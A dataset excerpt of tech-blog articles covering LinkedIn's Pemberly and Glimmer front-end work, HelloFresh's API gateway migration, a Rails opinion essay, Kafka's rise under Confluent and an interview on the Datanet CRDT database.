29,engineering,Pemberly at LinkedInCoauthors  Sarah Clatterbuck  Mark Pascual  Chad Hietala  Eugene O Neill  When setting out to re imagine our flagship app and desktop web experiences last year  we wanted to make a move to a more modern technology stack  We were falling behind in a few areas and wanted to address the following points of concern   Responsiveness  Modern web apps are typically heavily client rendered to provide the user with a more responsive user experience  The design team wanted to create page transition experiences  which are not possible in traditional web pages  When a traditional web page is requested  the browser loads it suddenly and jarringly as the response is fulfilled  Conversely  in a client rendered app  transitions can be made to elegantly fade or slide in  because the Document Object Model  DOM  of the existing page is being replaced rather than a new page being requested from the server  Also  we wanted our desktop member experience to be more app like and aligned with the native mobile app experience both for consistency between platforms and snappy feeling interactions   State management  In our patterns for addressing JavaScript in web pages  we had great conventions around widgets and DOM manipulation  However  where things got really complicated was when we needed to manage state  There were a number of hand rolled solutions to managing state along with several imports of various libraries to do the same  This led to a fracturing of our frontend ecosystem and an inability to provide adequate developer tooling for developing with these more complex tool sets   Developer productivity  In addition to creating an easy way to manage state  we also wanted to provide greater developer productivity  This included the ability to go from writing code and tests to deploying in several hours  We also wanted to bring together our fractured frontend ecosystem into a single set of conventions that all the teams developing long lived stateful apps would follow  In order to get to the level of productivity desired  we also needed a robust set of tooling for creating dev and production builds and writing unit and acceptance tests for JavaScript   The solution  Pemberly  We decided to build up a solution  dubbed Pemberly  combining open source software we were already using in the mid tier  Play  along with a web framework  Ember  for JavaScript that would deliver strong conventions  easy ability to manage state  a robust build and testing methodology  and the delightful  app like user experience we were targeting 
30,engineering,Scaling   HelloFresh  API GatewayMonday  February 20  2017 at 8 56AM  HelloFresh keeps growing every single day  our product is always improving  new ideas are popping up from everywhere  our supply chain is being completely automated  All of this is simply amazing us  but of course this constant growth brings many technical challenges   Today I d like to take you on a small journey that we went through to accomplish a big migration in our infrastructure that would allow us to move forward in a faster  more dynamic  and more secure way   The Challenge  We ve recently built an API Gateway  and now we had the complex challenge of moving our main  monolithic  API behind it   ideally without downtime  This would enable us to create more microservices and easily hook them into our infrastructure without much effort   The Architecture  Our gateway is on the frontline of our infrastructure  It receives thousands of request per day  and for that reason we chose Go when building it  because of its performance  simplicity  and elegant solution to concurrency   We already had many things in place that made this transition more simple  some of them are   Service Discovery and Client Side Load Balancing  We use consul as our service discovery tool  This together with HAProxy  enables us to solve two of the main problems when moving to a microservice architecture  service discovery  automatically registering new services as they come online  and client side load balancing  distributing requests across servers    Automation  Maybe the most useful tool in our arsenal was the automation of our infrastructure  We use Ansible to provision anything in our cloud   this goes from a single machine to dealing with network  DNS  CI machines  and so on  Importantly  we ve implemented a convention  when creating a new service  the first thing our engineers tackle is to create the Ansible scripts for this service   Logging and Monitoring  I like to say that anything that goes in our infrastructure should be monitored somehow  We have some best practices in place on how to properly log and monitor your application   Dashboards around the office show how the system is performing at any given time   For logging we use the ELK Stack  which allows us to quickly analyze detailed data about a service s behavior   For monitoring we love the combination of statsd   grafana  It is simply amazing what you can accomplish with this tool   Grafana dashboards give amazing insight into your performance metrics  Understanding the current architecture  Even with all these tools in place we still have a hard problem to solve  understand the current architecture and how we can pull off a smooth migration  At this stage  we invested some time on refactoring our legacy applications to support our new gateway and authentication service that would be also introduced in this migration  watch this space for another article on that   Ed    Some of the problems we found   While we can change our mobile apps  we have to assume people won t update straight away  So we had to keep backwards compatibility   for example in our DNS   to ensure older versions didn t stop working   We had to analyze all routes available in our public and private APIs and register them in the gateway in an automated way   We had to disable authentication from our main API and forward this responsibility to the auth service   Ensuring the security of the communication between the gateway and the microservices   To solve the import problems we wrote a script  in Go  again  to read our OpenAPI specification  aka Swagger  and create a proxy with the correct rules  like rate limiting  quotas  CORS  etc  for each resource of our APIs   To test the communication between the services we simply set up our whole infrastructure in a staging environment and started running our automated tests  I must say that this was the most helpful thing that we had during our migration process  We have a large suite of automated functional tests that helped us maintaining the same contract that the main API was returning to our mobile and web apps   After we were quite sure that our setup worked on our staging environment we started to think about on how to move this to production   The first attempt  Spoiler alert  our first attempt at going live was pretty much a disaster  Even though we had a quite nice plan in place we were definitely not ready to go live at that point  Let s check the step by step of our initial plan   Deploy latest version of the API gateway to staging  Deploy the main API with changes to staging  Run the automated functional tests against staging  Run manual QA tests on staging website and mobile apps  Deploy latest version of the API gateway to live  Deploy the main API with changes to live  Run the automated functional tests against live  Run manual QA tests on live website and mobile apps  Beer  Everything went quite well on staging  at least according to our tests   but when we decided to go live we started to have some problems   Overload on the auth database  we underestimated the amount of requests we d receive  causing our database to refuse connections Wrong CORS configuration  for some endpoints we configured the CORS rules incorrectly  causing requests from the browser to fail  Thanks to our database being flooded with requests we had to roll back right away  Luckily  our monitoring was able to catch that the problem occurred when requesting new tokens from the auth service   The second attempt  We knew that we didn t prepare well for our first deploy  so the first thing we did right after rolling back was hold a post mortem  Here s some of the things we improved before trying again   Prepare a blue green deployment procedure  We created a replica of our live environment with the gateway deployed already  so all we needed to when the time came was make one configuration change to bring this cluster online  We could rollback if necessary with the same simple change   Gather more metrics from the current applications to help us have the correct machine sizes to handle the load  We used the data from the first attempt as a yardstick for the amount of traffic we expected  and ran load tests with Gatling to ensure we could comfortably accommodate that traffic   Fix known issues with our auth service before going live  These included a problem with case sensitivity  a performance issue when signing a JWT  and  as always  adding more logging and monitoring   It took us around a week to finish all those tasks  and when we were finished  our deployment went smoothly with no downtime  Even with the successful deployment we found some corner case problems that we didn t cover on the automated tests  but we were able to fix them without a big impact on our applications   The results  In the end  our architecture looked like this   API Gateway Architecture  Main API  10  main API servers on High CPU Large machines  MySQL instances run in a master replica setup  3 replicas   Auth service  4 application servers  PostgreSQL instances run in a master replica setup  2 replicas   A RabbitMQ cluster is used to asynchronously handle user updates  API Gateway  4 application servers  MongoDB instances run in a master replica setup  4 replicas   Miscellaneous  Ansible is used to execute commands in parallel on all machines  A deploy takes only seconds  Amazon CloudFront as the CDN WAF  Consul   HAProxy as service discovery and client side load balancing  Statsd   Grafana to graph metrics across the system and alert on problems  ELK Stack for centralizing logs across different services  Concourse CI as our Continuous Integration tool  I hope you ve enjoyed our little journey  stay tuned for our next article 
31,engineering,Rails has won  The Elephant in the RoomTo make it clear  the dialectic technical arguments he makes are all true  But half the article   as he stated himself   is just rant  pure rethoric  And I think it would be good to balance it out  which is what I will try to do in this post   Solnic is right  Ruby  by itself  has little to no future alone  Rails is a real monopoly in this community and most OSS projects are targeting Rails  And yes  Rails do encourage some bad practices and anti patterns  This can be very discouraging to many OSS contributors  specially because to change the direction of a huge Elephant takes humongous effort   First of all  it s inevitable but I still hate dramatic headlines  even though I write like this myself sometimes   My time with Rails is up  like it s saying  And you should leave Rails now too if you re smart   I dismissed the article entirely because of that  I was about to post a counter rant to that without reading it properly  but now that I have  I wrote this new article from scratch   I just read a very well written and important article from OSS contributor Solnic and I have to agree with him in almost every technical point   Accepting Reality  The reality is this  Rails is tailor made for Basecamp   We all know that  or we should  Basecamp like apps are not too difficult to make  at least in terms of architecture  You don t need fancy super performant languages with super duper highly concurrent and parallel primitives  Also a reality is that 80  of the web applications are Basecamp like  disclosure  my feelings for years of experience in consulting   Which is why Rails has endured so far   It s like content management systems  or CMS  Most of them are blog like systems  And for that you should go ahead and install Wordpress  The very same arguments made against Rails can be done against Wordpress  And you should never  ever  tweak Wordpress to be anything but a blog system  Try to make it into an e commerce for high traffic  and you will suffer   To make it clear  Wordpress has one of the most offensive source codes I ve ever seen  I would hate having to maintain that codebase  I m sorry if anyone from the Wordpress base of contributors is reading this  I say this without malevolence  And you know what  Possibly half of all CMSs in the world are Wordpress  Over a million websites   Then you have the case for Magento2  Big rewrite over the original Magento  written using all the dreaded Zend stuff that everybody else dislikes  But it s huge  If you need a fast turn key solution for e commerce  look no further   Do Wordpress plugins work with Magento  Nope  They are 2 fragmented  independent and isolated communities  But they both generate a lot of revenue  which is what covers the cost of redundancy between them  And this is not even counting Drupal  Joomla  PHP is one big ocean of disconnected islands  Countries with severe immigration laws   Fragmentation is no stranger to the Javascript world  But it s a different kind of value generation  Facebook  Google  Microsoft  they all want to be the thought leaders in the fast evolving Millenials generation  It s a long term strategy  And one of the elements of this game is the Browser  But not only in terms of Chrome vs Firefox vs IE  but also on how applications are implemented   Facebook came up with React  Google came up with Polymer and Angular  The Node guys went through a power struggle with Joyent which almost resulted in further fragmentation but they settled for the Node Foundation   Apple went all on war against Adobe s Flash and then only now Google is turning them off in Chrome  but they are all looting on the consequences for all the attention it brings in the Web Development communities   Apple wants native to succeed and Swift to be the one language to lead it all  Google has conflicting strategies because they want native Instant Apps to succeed but if it fails  plan B continues to be for them to dominate HTML5 CSS3 based web apps with Angular  Facebook don t want to have their fate being decided by the power struggle between Apple and Google   It s a complex power struggle unfolding  and you can see that it s not about technical prowess  it s not about value generation  It s about ego  influence and power  Very fitting for the YouTuber generation  And the web technologies are being held hostage in this siege  if you havent s noticed   Then there is the issue that Ruby s future is now tightly coupled with Rails  This is a reality and if you re a Rubyist that don t like Rails  I feel bad for you  But not so much  For example  if Hanami is interesting I believe at least one company invested on it  If no one is using it  then it doesn t matter how technically superior it is  If Rom rb is great someone should be using it  otherwise what s the point  Why create a technical marvel that no one wants  But if there is at least one company using it  it s enough reason to keep going  regardless of what happens to Rails or what DHH says or does   People think that because something is  technically superior  everybody else should blindly adopt  But this is not how the market works   Of all the cosmic size events going on out there  I really don t sweat it that much if Ruby stays tied to Rails  What would it do without it   All communities face fragmentation at some point  It s very difficult and expensive to maintain cohesiveness for a long time  The only community that I think achieved that through sheer force of regulation is Microsoft s  NET stack  It doesn t mean that there were no pressure from the outside  Rails itself played a big role into influencing the move from old ASP NET to ASP NET MVC  Now they finally acquired Xamarin before  NET could steer out of their control in open source platforms they don t control   Ruby on Rails is the only other  cohesive  community I ve seen  With the upside that Basecamp doesn t need hundreds of thousands of developers to exist  A niche market would suffice  enough for the framework to evolve gradually through OSS processes  Which is why I always question the history and origins of tools and technologies to make my decisions on where to use them  not just technical prowess   Rails works because it doesn t have to play politics with Apple  Facebook  Microsoft  Google or any other committees  by the way  by default  I never trust committees   Those who depend on Rails will do the house keeping  directly  Heroku  Github  New Relic  Shopify  and many talented developers   3 Laws of Market Reality  It s easy to over analyse something after the fact  10 years down the road  I can easily trace back an optimal path  avoiding all boobtraps and obstacles along the way  Doesn t make me any genius  just shows that I can connect the   now clearly visible   dots  No solution implementation is perfect  If it actually solves a real problem it s bound to be imperfect  If it solves a real problem in a fast paced changing market  the more imperfect  Either you build tools because your core business applications depend on it or you build tools to sell  The former will usually be better   in terms of market fit   than the latter  So if you have to blindly choose  go with the former   So  first of all  I will always prefer tools that solve a real problem made by those that actually depend on them  Otherwise  the shoemaker s son will end up barefoot  Case in point  I will definitely use Angular  if I have to  But I would never  ever  begin a new business that depends solely on Angular to survive  Why  Because Google doesn t need it  It didn t blink to give up GWT  it didn t have to think twice to decide to rewrite Angular 2 in an incompatible way to Angular 1  and so on   Second of all  I will always see what other external factors will influence the fate of the technology  Imagine that I spent a whole lot of time writing scripts  libraries  tools for Grunt  Then people decide it s bad  Now Gulp is the better choice   and you will find plenty of technical reasons  Now you invest a lot of time writing everything you had for Grunt to Gulp  Then  for plenty of other reasons people decide that Webpack is the best choice  And there you go again  NIH  Not invented here  syndrome gallore   This is clearly a small bubble  It s tulips all over again  There are too many big players  Facebook  Google  Apple  Microsoft  Mozilla  etc  with big pockets  plenty of time and resources  This is how an experimental lab works in public  Lots and lots of experimental alternatives and several businesses blindly choosing depending on the best sales pitch of the week   Sometimes this kind of situation makes the monopoly of ASP NET on the Microsoft camp and the Rails monopoly on the Ruby camp seen innocuous  And yes  I compared Rails to  NET here  They are the 2 most comparable stacks  Possibly comparable to Spring faction in the Java camp  If you remember the history  Spring was like Rails in the Java community  rising up against the humongous complexity of the official J2EE stack back in 2002  And then Spring itself became the new J2EE like behemoth to beat   This is a millenia old dillema    You either die a hero  or live long enough to see yourself become the villain    Why is Rails a problem now   As I said before  I agree to almost every technical problem that Solnic outlined   Rails is indeed the brainchild of David Hansson  DHH   DHH is a person  with a very big ego  and a business to run  You can t expect any person to be reasonable all the time  specially one that pushed something up from zero  both a business and a technology platform   When it started  people defected from Java   NET  PHP even Python  in droves and they all acknowledged how interesting Rails was compared to J2EE  ASP NET  Plone  It offered not only productivity but technical enjoyment  We were discussing the wondreous world of dynamic languages  open classes  injecting behavior on the fly  aka monkey patching   we all stood up and aplauded dropping all unnecessary abstrations   We could not have enough of our Ruby fix  spitting out all the Perl like magic we would accomplish in a language that didn t feel ugly as PHP or bureacratic like Java or C   And they all laughed   The Golden Age from 2004 to 2006 saw a never ending stream of celebratory masturbation of Perl like coding prowess  We learned Ruby through Why  the Lucky Stiff most obscure black magic  remember that  It was everything but clean and modular architectures   Then we entered the Silver Age  from 2007 to around 2011  Rails actually went too far  too fast  Suddenly we saw big companies popping up from everywhere  Twitter  Github  Engine Yard  Heroku  Zendesk  Airbnb  everybody drunk the Rails cool aid  The opportunity was there to offer something for the enterprise  Merb was ahead of its time and it was pitched the wrong way  I do think that confronting the almighty Rails upfront  at that point  was not smart  You should expect overreaction and it did came and it was a swift blow  I will be honest and say that I was very aprehensive in 2009 and 2010 to see if the Rails 3 pseudo rewrite  pseudo Merb merge would actually come through   2011 to 2016 was the Bronze Age  a bittersweet period  That s because many new languages have emerged and finally reached  usable  state  From JS s V8 and Node js  to Rust  to Clojure  to Elixir  and even some gems from the past started to get attention  such as Scala and even Haskell  The most important change of all  2010 saw the advent of the Walled Garden App Store  commercially available native applications for smartphone and tablets  Forget web development  mobile was getting it all   And that s when all the big companies started to show their deep pockets  Apple releases Swift  Google released Dart  Angular  Go  Microsoft released Typescript  ASP NET MVC then vNext and had it s hands full working on Windows 10  Facebook entered the game late by releasing React and then React Native   Rails can now be considered a  problem  for the very same reasons that made it popular in the first place  And this is bound to happen to any technology   But you can t change the architecture of Rails too much  otherwise you risk breaking down very big chunks of the projects that are deployed in production now  And when someone has to rewrite big chunks of a project you might as well consider rewriting it in something else entirely   Many people are doing exactly that  specially for APIs and web applications implemented as SPAs talking to APIs  The APIs can be written in Go  Elixir  Scala and avoid Ruby altogether  You lose the fast turn around of the Rails ecosystem  but if you can afford it  you re a Unicorn startup with deep pockets   why not   But again  for the 90  of small to medium projects out there  you can still get the best punch for the buck using Rails and all the libraries available for Rails  It s like saying  if you want to build a blog  go for Wordpress and you will get the best benefit for the limited resources you have  Don t try to be fancy and write an SPA blog using Go APIs with React from scratch  Feasible  but not worth it   If you re a medium company already using Rails for some time  first of all make sure you adhere to basic best practices  Add tests and specs if you haven t already  Steadily refactor code  remove duplication  upgrade gems  Then you should consider adding an abstration layer such as Trailblazer and possibly consider componentizing parts of your application as Rails Engines or removing those parts into separated Rails API applications to be consumed  if possible  But do one step at a time  as needed   One rarely benefits from big bang rewrites from scratch   Conclusion  So yes  for developers such as Solnic the Rails community is probably a frustrating place to be  But it s also an addiction that s hard to drop because Rails is so much larger than any other competitor in any other new and fancy platform  you always feel bad for being the underdog   Rails went from underdog to mainstream in 5 years  Possibly the fastest growth any web framework ever achieved  The life of a web developer from 1995 to 2003 was not particularly interesting  Rails did a lot to improve it  And if anyone thinks they can do better  just do it  What s the point of writing about Rails  More than just code competing against code  results should compete against results   Active Record s architecture will indeed hurt hard maybe 10  of the cases out there  Active Support does not have a better alternative so far  and just removing it won t bring anything of value for the end user  Replacing a big component such as Active Record for something  better  such as an improved version of DataMapper or Rom rb as the default again won t bring so much value  specially for the hundreds of applications out there  You re telling everybody to just rewrite everything  And if I would have to rewrite  I would definitely do a new application using Rails   Trailblazer or go straight to Hanami  But most people would decide in favor of ditching Ruby altogether   Could Active Record be better  Sure  We have old Data Mapper  Sequel and ROM rb to prove it  But the real question is  could it be done better back in 2004 when it was first created  I don t think so  Now even the creator of DataMapper advocates for No ORM  In 2004  NoSQL  wasn t even a thing  The best we had back then was Hibernate  way before JPA  And for all intents and purposes  Active Record still does much better than average  But if you re big  you should be careful  That s all   The other communities will face the same predicaments we are now facing in the Rails community  It s inevitable  Everything is so much easier when you have a small community that even if you break things it won t be too bad  It s much harder to maintain something that actually became big beyond your most optimistic scenarios   I do understand the conservative approach DHH is taking by not making big disruptions  If this is something he is doing because he believes in conservative moves or because he doesn t understand better architectural options is not up to me to judge  but it s a valid move that will alienate advanced developers like Solnic but still allow for beginners to jump right into it without worrying too much right now about too many abstractions   Update  DHH commented on this section later    akitaonrails It s not out of conservatism  But a difference of opinion and values  I love Active Record  Love callbacks    DHH   dhh  May 24  2016   akitaonrails Will everyone love the same techniques and methods as me  Of course not  see RSpec for just one popular example    That s fine   DHH   dhh  May 24  2016  People forget that abstractions are very nice for advanced developers that had suffered the lack of them  But beginners will always suffer if presented with too many architectural choices upfront  Understanding GoF Design Patterns  Data Driven Design  SOLID  Enterprise Architectures  etc is very overwhelming  Experienced people often forget the learning curve when they were themselves beginners  and at that time Rails was so attractive  so sexy  Remember that feeling  Of accomplishment in the face of the knowledge that some nice witch left super useful black magic behind   Rails has won for it s simplicity for beginners  having a  rails  like guidance for experienced people as well  and somewhat acceptable flexibility for more advanced developers  Will it be able to maintain another 10 years in face of the many smaller alternatives out there trying to recreate everything from scratch  Time will tell   I think it would be a good fit to finish with Bob Dylan 
32,engineering,Glimmer  Blazing Fast Rendering for Ember js  Part 1Coauthors  Chad Hietala and Sarah Clatterbuck  At LinkedIn  we use Ember js as our client side web application framework  This is part of the larger Pemberly architecture we employ  Historically  native applications have had a large advantage over web applications in terms of not only technical capabilities  but also in their ability to drive engagement due to extremely rich SDKs  That being said  this environment has changed pretty drastically over the past five years  as the browser has evolved from a document viewer into the world s widest distributed application runtime  Below are some examples of functionality that one would have associated with a native experience five years ago that are now available to the web platform   Ember s goal is to be an SDK for the web that ties together these low level APIs into a more productive developer experience that leads developers down a path of success  Having an opinionated tool chain not only allows you to scale up  but also to be able to completely overhaul pieces of infrastructure in a backward compatible way without impacting application code   By default  Ember applications construct their UIs on a user s computer instead of utilizing a string of HTML from the server  While this is done to allow for very interactive applications post initial render  you have to deal with reality  users on the web are network bound  CPU bound  and memory bound  Because of this  app developers must pay attention to not only the payload size  but also the parse compile and execution time  Having a framework with an opinionated architecture across applications allows us to address performance related bottlenecks in a structured manner and optimize the system holistically   Last year  we contributed to an evolution of Ember s rendering engine to drastically reduce payload size  CPU time  and memory pressure to further our efforts to provide a delightful browsing experience for our flagship mobile web and desktop web apps  While the team has also been working on Fastboot  a means of server side rendering Ember applications  we still needed to optimize the runtime for future work we would like to do  Our team at LinkedIn specifically contributed to both to the development and the integration of a ground up re write of the rendering engine under the Glimmer2 code name  now simply known as Glimmer   Originally  the first iteration of Glimmer  now known as Glimmer1  was a thin layer that sat on top of HTMLBars  In 2016  at EmberConf  the next generation of Glimmer was announced as a ground up rewrite that would incorporate learnings and realizations from the past five years of client side rendering to increase the performance in this area of the framework  These learnings including   Components should become first class primitives of the rendering engine  allowing for runtime optimizations  Templates are just a declarative way of describing a UI and because of this  they have properties like referential transparency  Templates have time varying values  making them essentially functional reactive programs  FRP  that you can re run to update the values and produce a new UI  Instead of push based semantics for updating the template  the system can be modeled as a discrete pull based system with no notion of observers or notifications  Since we are effectively designing a programming language and the underlying runtime  we should architect it using well standing tenets in programing language implementation  such as JIT Compilers and bytecode interpreters  Having a VM architecture would allow us to more easily implement well known optimizations such as constant folding  inlining  macro expansion  etc  Since the project would be sufficiently complex  we wanted a first class type system  For this we chose to write Glimmer in TypeScript  In addition to making a project more maintainable  they also enforce object shape  which is an heuristic several JavaScript engines use to optimize   With this design considerations in mind  we first had to change how templates were compiled to drastically reduce the size of code we send to a user s browser  This involved changing the compilation stack that occurs during the build of an Ember application   Ahead of Time  AoT  stack  This part of the Glimmer architecture has a lot of similar parts to the Glimmer1 HTMLBars pre compilation stack in that it uses the Handlebars parser and spec compliant HTML Parser and Tokenizer to produce a combined Abstract Syntax Tree  AST   which is consumed by the JavaScript compiler  While the majority of the AoT Compiler stack is the same as its predecessor  it differs in that it produces a JSON structure known as the Wire Format instead of an executable JavaScript program  Below is a high level diagram of how the stack works 
33,engineering,More Efficient Mobile Encodes for Netflix DownloadsAbout the Netflix Tech Blog  This is a Netflix blog focused on technology and technology issues  We ll share our perspectives  decisions and challenges regarding the software we build and use to create the Netflix service     
34,engineering,How Kafka Redefined Data Processing for the Streaming AgeThe Apache Kafka phenomenon reached a new high today when Confluent announced a  50 million investment from the venture capital firm Sequoia  The investment signals renewed confidence that Kafka is fast becoming a new and must have platform for real time data processing  says Kafka co creator and Confluent CEO Jay Kreps    What we re seeing in the world  and why Sequoia and existing investors were so excited  is the emergence of this whole new category of infrastructure around streaming  a streaming platform   Kreps tells Datanami in an interview last week    It s a different category of thing   he adds   I don t think there was something quite like this before  There were technologies that were precursors  but they re pretty different technically    Kafka was created  like all great products  out of necessity  The social network LinkedIn had all manners of distributed systems to help process data  including Hadoop  which it often struggles to run efficiently  see today s story on Dr  Elephant   But the company lacked a durable message bus that could reliably deliver hundreds of millions of messages a day   So Kreps and his LinkedIn colleagues  Neha Narkhede and Jun Rao  did what they needed to do  they built a new publish and subscribe messaging bus for LinkedIn  The new system  dubbed Kafka  worked so well that they decided to open source it  In 2014  Kreps  Rao  and Narkhede left LinkedIn to found Confluent with the idea of building a commercial product around what was then an incubating Apache Kafka project   Since then  Kafka has caught on like wildfire  Companies were impressed not only with Kafka s capability to reliably deliver huge volumes of data from their sources to their destinations  but to do so without requiring large armies of skilled technicians to implement a complex distributed system  Kafka users especially appreciate how they can set up various streams of data  what are known as  Kafka topics   and then allow people to subscribe to those streams  As a standalone distributed system that runs on clusters of X86 servers  Kafka is equally adept at serving up data for transactional and analytical purposes alike   Today  the distributed system has been adopted by more than one third of the Fortune 500  Subscriptions to Confluent Enterprise  a version of Kafka that adds proprietary management and monitoring features  surged by 700  last year  Third party application vendors are flocking to support Kafka and build open source connectors so their customers can partake of the digital riches flowing across these new Kafka pipe   In short  Kafka has quickly become the defacto standard messaging bus underlying real time stream processing  and that puts Confluent and Kreps right at ground zero of a new wave of innovation    It s exciting because there aren t that many truly new categories of infrastructure that come around   he says   There are a million and one databases  and I m sure tomorrow there will be a million and two  But because there are so many  they end up being almost niches  whereas this can really be something that ties together and be the core data flow in the enterprise and the big central nervous system that everything comes off of    Building a digital version of a central nervous system comes with its share of pressure  If Kreps and company bungle something in Kafka  it could impact hundreds of thousands of companies and hundreds of millions of consumers who are dependent on data services that are being built on a Kafka foundation   But Kreps and his Confluent colleagues are building a reputation for getting stuff right  for rolling things out slowly and making sure they ve dotted their i s and crossed their t s before publicly stating that new releases are ready for production use  The company is nearing completion of a major new feature in Kafka  exactly once processing  that is the holy grail of distributed computing  and they re being extra cautious about it   Before starting to code the exactly once processing feature in Kafka  the company published its theory on how to solve the problem in a paper  with the idea that other distributed systems experts can poke holes in the idea and find flaws  Kreps and his colleagues had kicked around ideas for how to add more transactional capabilities into the distributed messaging system  and wanted to see if he was way off base    It s a little like security in that way   Kreps says   You want people to find the flaws early on rather than when it s running in production and it crashes  We ve got through that process  and now we re going through the process of implementing it    You can follow the development of the exactly once feature on GitHub if you so desire  It s not yet ready for production  but Kreps says it s on track to be added to Kafka  perhaps before the Kafka Summit takes place in New York City in May   Kreps seems to get off on tackling these sorts of distributed systems engineering challenges  It s a high stakes game being played out in a public venue  with tens of millions of dollars on the line  It s not a game for the faint of heart  but the rewards are potentially much greater than even the  80 million that Confluent has received in venture capital so far    It s actually technically challenging to make something so complicated actually be simple and easy to use and build on   Kreps says   I guess we ll be judged based on whether or not we can make that successful  as this category emerges and as it matures and as more applications come  It s not an easy thing to do  I m super proud of what we ve built so far and I hope that we continue to be perceived that way by the people adopting it    The baffling thing about Kafka  the enigma as it were  is that it exists on the cutting edge of what computer science can accomplish  and yet it remains a relatively simple tool  especially compared to its distributed system brethren  Hadoop  That s been the design principle of Kafka since the beginning  and Kreps hopes that it will remain that way into the foreseeable future    That s really the challenge we ve set for ourselves   he says   We d like this to be the way that if you re going to build asynchronous microservices in your company  this would be the tool you would reach for  Not the tool you have to reach for if your data is really  really big or the tool you re forced to after you ve exhausted all the other solutions  but the thing that s the easiest and best to go to start with  and it will scale horizontally to the size of a company    Related Items   Exactly Once  Why It s Such a Big Deal for Apache Kafka  Distributed Stream Processing with Apache Kafka  The Real Time Future of Data According to Jay Kreps
35,engineering,Datanet  a New CRDT Database that Let s You Do Bad Bad Things to Distributed DataMonday  October 17  2016 at 9 44AM  We ve had databases targeting consistency  These are your typical RDBMSs  We ve had databases targeting availability  These are your typical NoSQL databases   If you re using your CAP decoder ring you know what s next   what databases do we have that target making concurrency a first class feature  That promise to thrive and continue to function when network partitions occur   No many  but we have a brand new concurrency oriented database  Datanet   a P2P replication system that utilizes CRDT algorithms to allow multiple concurrent actors to modify data and then automatically   sensibly resolve modification conflicts   Datanet is the creation of Russell Sullivan  Russell spent over three years hidden away in his mad scientist layer researching  thinking  coding  refining  and testing Datanet  You may remember Russell  He has been involved with several articles on HighScalability and he wrote AlchemyDB  a NoSQL database  which was acquired by Aerospike   So Russell has a feel for what s next  When he built AlchemyDB he was way ahead of the pack and now he thinks practical  programmer friendly CRDTs are what s next  Why   Concurrency and data locality  To quote Russell   Datanet lets you ship data to the spot where the action is happening  When the action happens it is processed locally  your system s reactivity is insanely quick  This is pretty much the opposite of the non concurrent case where you need to go to a specific machine in the cloud to modify a piece of data regardless of where the action takes place  As your system grows  the concurrent approach is superior  We have been slowly moving away from transactions towards NoSQL for reasons of scalability  availability  robustness  etc  Datanet continues this evolution by taking the next step and moving towards extreme distribution  supporting tons of concurrent writers  The shift is to more distribution in computation  We went from one app server   one DB to app server clusters and clustered DBs  to geographically distributed data centers  and now we are going much further with Datanet  data is distributed anywhere you need it to a local cache that functions as a database master   How does Datanet work   In Datanet  the same piece of data can simultaneously exist as a write able entity in many many places in the stack  Datanet is a different way of looking at data  Datanet more closely resembles an internet routing protocol than a traditional client server database     and this mirrors the current realities that data is much more in flight than it used to be   What bad bad things can you do to your distributed data  Here s an amazing video of how Datanet recovers quickly  predictably  and automatically from Chaos Monkey level extinction events  It s pretty slick   Here s an email interview I did with Russell  He goes into a lot more detail about Datanet and what it s all about  I think you will find it interesting   Let s start with your name and a little of your background   My name is Russell Sullivan  I am a distributed database architect  I created AlchemyDB which was acquired by Aerospike where I became the principal architect and these days I am working on a new startup project called Datanet   What have you brought to show and tell today   A shiny new open source CRDT  conflict free replicated data types  based data synchronization system named Datanet   Datanet is a P2P replication system that utilizes CRDT algorithms to allow multiple concurrent actors to modify data and then automatically   sensibly resolve modification conflicts   Datanet s goal is aims to achieve ubiquitous write though caching   CRDT replication capabilities can be added to any cache in your stack  meaning modifications to these stacks are globally   reliably replicated  Locally modifying data yields massive gains in latency  produces a more efficient replication stream    is extremely robust   It s time to pre fetch data to compute     So AlchemyDB was a key value store and now you are creating a CRDT database  That s a big change  Why have you gone in that direction   CRDTs open up new use cases  you can do things with them that are not feasible without them  Plus I kept running into problems in the field where a CRDT system would be the perfect solution  Lastly Marc Shapiro and his people formalized the field of CRDTs between 2011 2014 so the timing worked   What problems do you see where CRDTs are the perfect solution   CRDT systems have some very interesting properties when compared to traditional data systems   First  in a CRDT system you locally modify your data and then immediately return to computation  This is great for say an app server request that looks up 5 pieces of data and then writes 2 pieces of data  If you are using a traditional DB  you have 7 network I Os for that request  If you are using a CRDT system and you have the necessary pieces of data locally cached  you do ZERO network I Os  in the fast path     you still have to replicate the 2 writes  but this happens later via lazy replication    Second  since CRDT systems have very loose requirements on the immediacy of replication they are inherently more robust in architectures with variable replication latencies  aka  replication over WAN   CRDT systems have no expectations of speedy or reliable replication  so hiccups  lag  or outages in the replication path are not disasters  they are merely delays that will be correctly processed as resources become available   These two points are very different  the first is all about doing everything locally and the second is about being robust to bad WAN networks  but they are subtly closely related  they are both byproducts of the fundamentally different  zero coordination  asynchronous  etc     manner in which CRDT systems replicate data   Can you go up a level or two  What kind of problems can you solving using Datanet that you can t solve or are hard to solve with existing systems   Datanet is unique in that it s a distributed system where data can be modified concurrently by multiple actors and the system automatically resolves any conflicts  To illustrate when these conflicts happen  lets use the example of a service that goes through multiple iterations of scaling   In the beginning the service has a single app server and a single database  As load grows a memcache cluster is added and the single app server becomes a cluster of app servers  Next geographical fail over is added via an additional data center  Finally to decrease request latency and increase request throughput the cluster of app servers is made stateful by adding a write through cache to every app server  Everyone of these system enhancements introduces a new point where additional actors concurrently modify data  In this architecture the list of actors is  each data center s database  each data center s memcache cluster  and every app server in both data centers   If we have 10 app servers per data center this means we have 24 concurrent actors modifying data  Traditional systems can only deal with a single concurrent actor modifying data  so they partition requests accordingly  For instance a given user is software load balanced to a sticky data center and then a sticky app server in that data center and this app servers write through cache is only utilized for per user information   If this architecture used Datanet  the partitioning logic would no longer be needed as all 24 actors are free to modify data concurrently   With Datanet app server logic can be stateless  each app server can locally modify partitionable data  e g  per user  as well as global data  e g  global user login counter  and then replicate asynchronously to every other actor caching the data where CRDT logic resolves the conflicts  The entire replication flow is wildly different than traditional flows  it has advantages in latency and robustness and of course some trade offs     Talks about CRDTs are very popular in academia  But they always sound so impractical  How is Datanet different  What engineering wizardry do you add to make CRDTs work for the everyday programmer   The current state of affairs is that CRDTs are beautiful academia gradually emerging to become practical systems   Datanet provides a simple API  JSON and presents CRDTs as a simple metaphor  local write through caches that replicate globally   JSON is simple  you set strings and numbers  you increment numbers  you add and delete elements from an array  it s all CS 101  Datanet hides the complexities of the underlying commutative replicated data types  e g  distributed zero coordination garbage collection  and clearly communicates how merge operations resolve conflicts  The goal is to lower the barrier of entry from someone with multiple PhD s to the junior developer level     To address CRDTs architectural complexities Datanet s messaging focuses on local operations  an actor modifies the contents of his local cache and this cache also receives external modifications  via Datanet  when other actors modify the same data  Each Datanet actor is a state machine 